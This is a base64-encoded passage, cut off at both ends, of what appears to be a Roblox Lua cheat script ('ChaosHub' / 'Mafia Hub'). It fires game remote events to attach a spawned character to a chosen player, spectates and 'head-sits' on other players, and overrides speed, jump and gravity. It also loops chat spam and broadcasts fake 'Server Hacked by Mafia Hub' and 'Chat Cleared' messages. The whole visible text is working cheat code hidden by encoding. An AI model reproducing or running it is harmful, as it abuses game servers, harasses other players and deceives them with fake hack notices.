gICBjaGFzaW5ncGxheWVyID0gc2VsZWN0ZWQKICAgICAgICBlbHNlCiAgICAgICAgICAgIGNoYXNpbmdwbGF5ZXIgPSBuaWwKICAgICAgICBlbmQKICAgIGVuZAp9KQoKQ2hpbGRUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFVwZGF0ZSBQbGF5ZXIgTGlzdCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHVwZGF0ZWRQbGF5ZXJzID0gdXBkYXRlUGxheWVyTGlzdCgpCiAgICAgICAgaWYgcGxheWVyQ2hpbGQgYW5kIHVwZGF0ZWRQbGF5ZXJzIHRoZW4KICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgcGxheWVyQ2hpbGRSZWZyZXNoKHVwZGF0ZWRQbGF5ZXJzKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGlmIGNoYXNpbmdwbGF5ZXIgYW5kIG5vdCBnYW1lLlBsYXllcnNGaW5kRmlyc3RDaGlsZChjaGFzaW5ncGxheWVyKSB0aGVuCiAgICAgICAgICAgICAgICBjaGFzaW5ncGxheWVyID0gbmlsCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgcGxheWVyQ2hpbGRTZXQoKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gUGxheWVyIGpvaW5sZWF2ZSBldmVudHMKZ2FtZS5QbGF5ZXJzLlBsYXllckFkZGVkQ29ubmVjdChmdW5jdGlvbigpCiAgICB0YXNrLndhaXQoMC4xKQogICAgbG9jYWwgdXBkYXRlZFBsYXllcnMgPSB1cGRhdGVQbGF5ZXJMaXN0KCkKICAgIGlmIHBsYXllckNoaWxkIGFuZCB1cGRhdGVkUGxheWVycyB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICBwbGF5ZXJDaGlsZFJlZnJlc2godXBkYXRlZFBsYXllcnMpCiAgICAgICAgZW5kKQogICAgZW5kCmVuZCkKCmdhbWUuUGxheWVycy5QbGF5ZXJSZW1vdmluZ0Nvbm5lY3QoZnVuY3Rpb24ocGxheWVyKQogICAgdGFzay53YWl0KDAuMSkKICAgIGxvY2FsIHVwZGF0ZWRQbGF5ZXJzID0gdXBkYXRlUGxheWVyTGlzdCgpCiAgICBpZiBwbGF5ZXJDaGlsZCBhbmQgdXBkYXRlZFBsYXllcnMgdGhlbgogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgcGxheWVyQ2hpbGRSZWZyZXNoKHVwZGF0ZWRQbGF5ZXJzKQogICAgICAgIGVuZCkKICAgICAgICBpZiBjaGFzaW5ncGxheWVyID09IHBsYXllci5OYW1lIHRoZW4KICAgICAgICAgICAgY2hhc2luZ3BsYXllciA9IG5pbAogICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBwbGF5ZXJDaGlsZFNldCgpCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAplbmQpCgpDaGlsZFRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gU2VuZCBDaGlsZCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIG5vdCBjaGFzaW5ncGxheWVyIHRoZW4KICAgICAgICAgICAgd2FybihObyBwbGF5ZXIgc2VsZWN0ZWQhKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICBpZiBub3Qgd29ya3NwYWNlRmluZEZpcnN0Q2hpbGQocGwuTmFtZSkgb3Igbm90IHdvcmtzcGFjZVtwbC5OYW1lXUZpbmRGaXJzdENoaWxkKEZvbGxvd0NoYXJhY3RlcikgdGhlbgogICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgWzFdID0gQ2hhcmFjdGVyRm9sbG93U3Bhd25QbGF5ZXIsCiAgICAgICAgICAgICAgICBbMl0gPSBCYWJ5Qm95CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgZXJyID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUJhYjF5Rm9sbG8xdylGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBpZiBub3Qgc3VjY2VzcyB0aGVuCiAgICAgICAgICAgICAgICB3YXJuKEVycm9yIHNlbmRpbmcgY2hpbGQgIC4uIGVycikKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgdGFzay53YWl0KDAuMikKICAgICAgICAKICAgICAgICBpZiB3b3Jrc3BhY2VGaW5kRmlyc3RDaGlsZChwbC5OYW1lKSB0aGVuCiAgICAgICAgICAgIGZvciBfLCB2IGluIHBhaXJzKHdvcmtzcGFjZVtwbC5OYW1lXUdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiB2SXNBKEJhc2VQYXJ0KSB0aGVuCiAgICAgICAgICAgICAgICAgICAgdi5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCB0YXJnZXQgPSBjaGFzaW5ncGxheWVyCiAgICAgICAgaWYgd29ya3NwYWNlRmluZEZpcnN0Q2hpbGQodGFyZ2V0KSBhbmQgd29ya3NwYWNlRmluZEZpcnN0Q2hpbGQocGwuTmFtZSkgYW5kIHdvcmtzcGFjZVtwbC5OYW1lXUZpbmRGaXJzdENoaWxkKEZvbGxvd0NoYXJhY3RlcikgdGhlbgogICAgICAgICAgICB3b3Jrc3BhY2VbcGwuTmFtZV0uRm9sbG93Q2hhcmFjdGVyLlBhcmVudCA9IHdvcmtzcGFjZVt0YXJnZXRdCgogICAgICAgICAgICBpZiByYXdnZXQoZ2V0Z2VudigpLCBSdW5TZXJ2aWNlKSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBnZXRnZW52KCkuUnVuU2VydmljZSA9IGdhbWVHZXRTZXJ2aWNlKFJ1blNlcnZpY2UpLkhlYXJ0YmVhdENvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgZm9sbG93Q2hhcmFjdGVyID0gd29ya3NwYWNlW3RhcmdldF1GaW5kRmlyc3RDaGlsZChGb2xsb3dDaGFyYWN0ZXIpCiAgICAgICAgICAgICAgICBpZiBmb2xsb3dDaGFyYWN0ZXIgYW5kIGZvbGxvd0NoYXJhY3RlckZpbmRGaXJzdENoaWxkKFRvcnNvKSBhbmQgZm9sbG93Q2hhcmFjdGVyLlRvcnNvRmluZEZpcnN0Q2hpbGQoQm9keVBvc2l0aW9uKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IHdvcmtzcGFjZVt0YXJnZXRdRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkKICAgICAgICAgICAgICAgICAgICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9sbG93Q2hhcmFjdGVyLlRvcnNvLkJvZHlQb3NpdGlvbi5Qb3NpdGlvbiA9IGh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24gLSAoaHVtYW5vaWRSb290UGFydC5DRnJhbWUuTG9va1ZlY3RvciAgMykKICAgICAgICAgICAgICAgICAgICAgICAgZm9sbG93Q2hhcmFjdGVyLlRvcnNvLkJvZHlHeXJvLkNGcmFtZSA9IGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpDaGlsZFRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gUmV0dXJuIENoaWxkLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgcmF3Z2V0KGdldGdlbnYoKSwgUnVuU2VydmljZSkgdGhlbgogICAgICAgICAgICBnZXRnZW52KCkuUnVuU2VydmljZURpc2Nvbm5lY3QoKQogICAgICAgICAgICBnZXRnZW52KCkuUnVuU2VydmljZSA9IG5pbAogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBhcmdzID0geyBbMV0gPSBEZWxldGVGb2xsb3dDaGFyYWN0ZXIgfQogICAgICAgIGxvY2FsIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUJhYjF5Rm9sbG8xdylGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICBlbmQpCiAgICAgICAgaWYgbm90IHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICB3YXJuKEVycm9yIHJldHVybmluZyBjaGlsZCAgLi4gZXJyKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBhcmdzMSA9IHsgWzFdID0gQ2hhcmFjdGVyRm9sbG93U3Bhd25QbGF5ZXIsIFsyXSA9IEJhYnlCb3kgfQogICAgICAgIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUJhYjF5Rm9sbG8xdylGaXJlU2VydmVyKHVucGFjayhhcmdzMSkpCiAgICAgICAgZW5kKQogICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgd2FybihFcnJvciBzcGF3bmluZyBjaGlsZCAgLi4gZXJyKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpDaGlsZFRhYkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gU3BlY3RhdGUgUGxheWVyLAogICAgRGVmYXVsdCA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykKICAgICAgICBsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZUdldFNlcnZpY2UoUnVuU2VydmljZSkKICAgICAgICBsb2NhbCBMb2NhbFBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBDYW1lcmEgPSB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIGlmIG5vdCBjaGFzaW5ncGxheWVyIHRoZW4KICAgICAgICAgICAgICAgIHdhcm4oTm8gcGxheWVyIHNlbGVjdGVkIHRvIHNwZWN0YXRlISkKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIG5vdCByYXdnZXQoZ2V0Z2VudigpLCBDYW1lcmFDb25uZWN0aW9uKSB0aGVuCiAgICAgICAgICAgICAgICBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGxheWVyID0gUGxheWVyc0ZpbmRGaXJzdENoaWxkKGNoYXNpbmdwbGF5ZXIpCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0UGxheWVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIGFuZCB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgQ2FtZXJhLkNhbWVyYVN1YmplY3QgPSB0YXJnZXRQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBpZiByYXdnZXQoZ2V0Z2VudigpLCBDYW1lcmFDb25uZWN0aW9uKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuQ2FtZXJhQ29ubmVjdGlvbkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb24gPSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZCkgb3IgbmlsCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVsc2UKICAgICAgICAgICAgaWYgcmF3Z2V0KGdldGdlbnYoKSwgQ2FtZXJhQ29ubmVjdGlvbikgdGhlbgogICAgICAgICAgICAgICAgZ2V0Z2VudigpLkNhbWVyYUNvbm5lY3Rpb25EaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgIGdldGdlbnYoKS5DYW1lcmFDb25uZWN0aW9uID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkKSB0aGVuCiAgICAgICAgICAgICAgICBDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IExvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAp9KQoKQ2hpbGRUYWJBZGRQYXJhZ3JhcGgoewogICAgVGl0bGUgPSBGRSwKICAgIENvbnRlbnQgPSBGRSBGZWF0dXJlcwp9KQoKLS0gTG9jYWwgUGxheWVyIFRhYgpsb2NhbCBMb2NhbFBsYXllclRhYiA9IFdpbmRvd01ha2VUYWIoe0xvY2FsIFBsYXllciwgdXNlcn0pCgpsb2NhbCBTZWN0aW9uID0gTG9jYWxQbGF5ZXJUYWJBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSBTcGVlZCwgR3Jhdml0eSBhbmQgSnVtcAp9KQoKTG9jYWxQbGF5ZXJUYWJBZGRUZXh0Qm94KHsKICAgIE5hbWUgPSBQbGF5ZXIgU3BlZWQsCiAgICBQbGFjZWhvbGRlclRleHQgPSBFbnRlciBzcGVlZCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgbG9jYWwgc3BlZWQgPSB0b251bWJlcih2YWx1ZSkKICAgICAgICBpZiBzcGVlZCBhbmQgcGwuQ2hhcmFjdGVyIGFuZCBwbC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZCkgdGhlbgogICAgICAgICAgICBwbC5DaGFyYWN0ZXIuSHVtYW5vaWQuV2Fsa1NwZWVkID0gc3BlZWQKICAgICAgICBlbHNlCiAgICAgICAgICAgIHdhcm4oSW52YWxpZCBzcGVlZCBvciBjaGFyYWN0ZXIgbm90IGZvdW5kISkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFJlc2V0IHNwZWVkLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgaWYgcGwuQ2hhcmFjdGVyIGFuZCBwbC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZCkgdGhlbgogICAgICAgICAgICBwbC5DaGFyYWN0ZXIuSHVtYW5vaWQuV2Fsa1NwZWVkID0gMTYKICAgICAgICBlbmQKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWJBZGRUZXh0Qm94KHsKICAgIE5hbWUgPSBKdW1wIEhlaWdodCwKICAgIFBsYWNlaG9sZGVyVGV4dCA9IEVudGVyIGp1bXAgaGVpZ2h0LAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2YWx1ZSkKICAgICAgICBsb2NhbCBqdW1wSGVpZ2h0ID0gdG9udW1iZXIodmFsdWUpCiAgICAgICAgaWYganVtcEhlaWdodCBhbmQgcGwuQ2hhcmFjdGVyIGFuZCBwbC5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZCkgdGhlbgogICAgICAgICAgICBwbC5DaGFyYWN0ZXIuSHVtYW5vaWQuSnVtcFBvd2VyID0ganVtcEhlaWdodAogICAgICAgIGVsc2UKICAgICAgICAgICAgd2FybihJbnZhbGlkIGp1bXAgaGVpZ2h0IG9yIGNoYXJhY3RlciBub3QgZm91bmQhKQogICAgICAgIGVuZAogICAgZW5kCn0pCgpMb2NhbFBsYXllclRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gUmVzZXQgSnVtcCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIHBsLkNoYXJhY3RlciBhbmQgcGwuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWQpIHRoZW4KICAgICAgICAgICAgcGwuQ2hhcmFjdGVyLkh1bWFub2lkLkp1bXBQb3dlciA9IDUwCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkxvY2FsUGxheWVyVGFiQWRkVGV4dEJveCh7CiAgICBOYW1lID0gR3Jhdml0eSwKICAgIFBsYWNlaG9sZGVyVGV4dCA9IEVudGVyIGdyYXZpdHksCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHZhbHVlKQogICAgICAgIGxvY2FsIGdyYXZpdHkgPSB0b251bWJlcih2YWx1ZSkKICAgICAgICBpZiBncmF2aXR5IHRoZW4KICAgICAgICAgICAgd29ya3NwYWNlLkdyYXZpdHkgPSBncmF2aXR5CiAgICAgICAgZWxzZQogICAgICAgICAgICB3YXJuKEludmFsaWQgZ3Jhdml0eSEpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkxvY2FsUGxheWVyVGFiQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBSZXNldCBHcmF2aXR5LAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgd29ya3NwYWNlLkdyYXZpdHkgPSAxOTYuMgogICAgZW5kCn0pCgpTZWN0aW9uID0gTG9jYWxQbGF5ZXJUYWJBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSBTcGFtIENoYXQKfSkKCmxvY2FsIFRleHRTYXZlCmxvY2FsIHRjcyA9IGdhbWVHZXRTZXJ2aWNlKFRleHRDaGF0U2VydmljZSkKbG9jYWwgY2hhdCA9IHRjcy5DaGF0SW5wdXRCYXJDb25maWd1cmF0aW9uIGFuZCB0Y3MuQ2hhdElucHV0QmFyQ29uZmlndXJhdGlvbi5UYXJnZXRUZXh0Q2hhbm5lbAoKZnVuY3Rpb24gc2VuZGNoYXQobXNnKQogICAgaWYgbm90IG1zZyBvciBtc2cgPT0gIHRoZW4gcmV0dXJuIGVuZAogICAgaWYgdGNzLkNoYXRWZXJzaW9uID09IEVudW0uQ2hhdFZlcnNpb24uTGVnYWN5Q2hhdFNlcnZpY2UgdGhlbgogICAgICAgIGxvY2FsIHN1Y2Nlc3MsIGVyciA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpRmluZEZpcnN0Q2hpbGQoRGVmYXVsdENoYXRTeXN0ZW1DaGF0RXZlbnRzKS5TYXlNZXNzYWdlUmVxdWVzdEZpcmVTZXJ2ZXIobXNnLCBBbGwpCiAgICAgICAgZW5kKQogICAgICAgIGlmIG5vdCBzdWNjZXNzIHRoZW4KICAgICAgICAgICAgd2FybihFcnJvciBzZW5kaW5nIGNoYXQgIC4uIGVycikKICAgICAgICBlbmQKICAgIGVsc2VpZiBjaGF0IHRoZW4KICAgICAgICBsb2NhbCBzdWNjZXNzLCBlcnIgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGNoYXRTZW5kQXN5bmMobXNnKQogICAgICAgIGVuZCkKICAgICAgICBpZiBub3Qgc3VjY2VzcyB0aGVuCiAgICAgICAgICAgIHdhcm4oRXJyb3Igc2VuZGluZyBjaGF0ICAuLiBlcnIpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpMb2NhbFBsYXllclRhYkFkZFRleHRCb3goewogICAgTmFtZSA9IEVudGVyIHRleHQsCiAgICBQbGFjZWhvbGRlclRleHQgPSBFbnRlciBtZXNzYWdlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih0ZXh0KQogICAgICAgIFRleHRTYXZlID0gdGV4dAogICAgZW5kCn0pCgpMb2NhbFBsYXllclRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gU2VuZCBDaGF0LAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgc2VuZGNoYXQoVGV4dFNhdmUpCiAgICBlbmQKfSkKCmdldGdlbnYoKS5DaGFvc0h1YlNlbmREZWxheSA9IDEKCkxvY2FsUGxheWVyVGFiQWRkU2xpZGVyKHsKICAgIE5hbWUgPSBTcGFtIERlbGF5LAogICAgTWluID0gMC40LAogICAgTWF4ID0gMTAsCiAgICBEZWZhdWx0ID0gMSwKICAgIEluY3JlbWVudCA9IDAuMSwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgZ2V0Z2VudigpLkNoYW9zSHViU2VuZERlbGF5ID0gVmFsdWUKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWJBZGRUb2dnbGUoewogICAgTmFtZSA9IFNwYW0gQ2hhdCwKICAgIERlZmF1bHQgPSBmYWxzZSwKICAgIEZsYWcgPSBUZXh0IFNwYXduaW5nLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBnZXRnZW52KCkuQ2hhb3NIdWJTcGF3blRleHQgPSBWYWx1ZQogICAgICAgIHdoaWxlIGdldGdlbnYoKS5DaGFvc0h1YlNwYXduVGV4dCBkbwogICAgICAgICAgICBzZW5kY2hhdChUZXh0U2F2ZSkKICAgICAgICAgICAgdGFzay53YWl0KGdldGdlbnYoKS5DaGFvc0h1YlNlbmREZWxheSkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKTG9jYWxQbGF5ZXJUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IFNwYW0gY2hhdCBIYWNrZWQgQnkgTWFmaWEsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBnYW1lR2V0U2VydmljZShUZXh0Q2hhdFNlcnZpY2UpLkNoYXRWZXJzaW9uID09IEVudW0uQ2hhdFZlcnNpb24uVGV4dENoYXRTZXJ2aWNlIHRoZW4gCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFRleHRDaGF0U2VydmljZSkuVGV4dENoYW5uZWxzLlJCWEdlbmVyYWxTZW5kQXN5bmMoaGlycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyclNlcnZlciBIYWNrZWQgYnkgTWFmaWEgSHViKQogICAgICAgIGVsc2UgCiAgICAgICAgICAgIHByaW50KE5vdGhpbmcpCiAgICBlbmQKZW5kCn0pCgpMb2NhbFBsYXllclRhYkFkZEJ1dHRvbih7CiAgICBOYW1lID0gQ2xlYXIgQ2hhdCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGlmIGdhbWVHZXRTZXJ2aWNlKFRleHRDaGF0U2VydmljZSkuQ2hhdFZlcnNpb24gPT0gRW51bS5DaGF0VmVyc2lvbi5UZXh0Q2hhdFNlcnZpY2UgdGhlbiAKICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoVGV4dENoYXRTZXJ2aWNlKS5UZXh0Q2hhbm5lbHMuUkJYR2VuZXJhbFNlbmRBc3luYyhoaXJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJycnJyU2VydmVyIENoYXQgQ2xlYXJlZCkKICAgICAgICBlbHNlIAogICAgICAgICAgICBwcmludChOb3RoaW5nKQogICAgZW5kCmVuZAp9KQoKU2VjdGlvbiA9IExvY2FsUGxheWVyVGFiQWRkU2VjdGlvbih7CiAgICBOYW1lID0gSGVhZHNpdAp9KQoKbG9jYWwgc2VsZWN0ZWRIZWFkU2l0ID0gbmlsCmxvY2FsIGhlYWRTaXRDb25uZWN0aW9uID0gbmlsCgpsb2NhbCBoZWFkU2l0RHJvcGRvd24gPSBMb2NhbFBsYXllclRhYkFkZERyb3Bkb3duKHsKICAgIE5hbWUgPSBTZWxlY3QgUGxheWVyLAogICAgRGVmYXVsdCA9ICwKICAgIE9wdGlvbnMgPSBwbGF5ZXJzLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBzZWxlY3RlZEhlYWRTaXQgPSBWYWx1ZQogICAgZW5kCn0pCgpMb2NhbFBsYXllclRhYkFkZFRvZ2dsZSh7CiAgICBOYW1lID0gSGVhZCBTaXQgKFBpZ2d5YmFjayksCiAgICBEZWZhdWx0ID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKGJvb2wpCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKICAgICAgICBsb2NhbCBodW1hbm9pZFJvb3RQYXJ0ID0gY2hhcmFjdGVyV2FpdEZvckNoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXJXYWl0Rm9yQ2hpbGQoSHVtYW5vaWQpCgogICAgICAgIGlmIG5vdCBzZWxlY3RlZEhlYWRTaXQgb3Igc2VsZWN0ZWRIZWFkU2l0ID09ICB0aGVuCiAgICAgICAgICAgIHdhcm4oTm8gcGxheWVyIHNlbGVjdGVkIGZvciBIZWFkIFNpdCEpCiAgICAgICAgICAgIHJldHVybiBmYWxzZQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBzZWxlY3RlZFBsYXllciA9IGdhbWUuUGxheWVyc0ZpbmRGaXJzdENoaWxkKHNlbGVjdGVkSGVhZFNpdCkKCiAgICAgICAgaWYgYm9vbCB0aGVuCiAgICAgICAgICAgIGlmIHNlbGVjdGVkUGxheWVyIGFuZCBzZWxlY3RlZFBsYXllci5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgaHVtYW5vaWQuU2l0ID0gdHJ1ZQoKICAgICAgICAgICAgICAgIGlmIGhlYWRTaXRDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICBoZWFkU2l0Q29ubmVjdGlvbkRpc2Nvbm5lY3QoKQogICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgaGVhZFNpdENvbm5lY3Rpb24gPSBnYW1lR2V0U2VydmljZShSdW5TZXJ2aWNlKS5IZWFydGJlYXRDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBpZiBzZWxlY3RlZFBsYXllci5DaGFyYWN0ZXIgYW5kIHNlbGVjdGVkUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKEhlYWQpIGFuZCBodW1hbm9pZC5TaXQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRIZWFkID0gc2VsZWN0ZWRQbGF5ZXIuQ2hhcmFjdGVyLkhlYWQKICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSB0YXJnZXRIZWFkLkNGcmFtZSAgQ0ZyYW1lLkFuZ2xlcygwLCAwLCAwKSAgQ0ZyYW1lLm5ldygwLCAxLjYsIDAuNCkKICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGhlYWRTaXRDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRTaXRDb25uZWN0aW9uRGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZWFkU2l0Q29ubmVjdGlvbiA9IG5pbAogICAgIC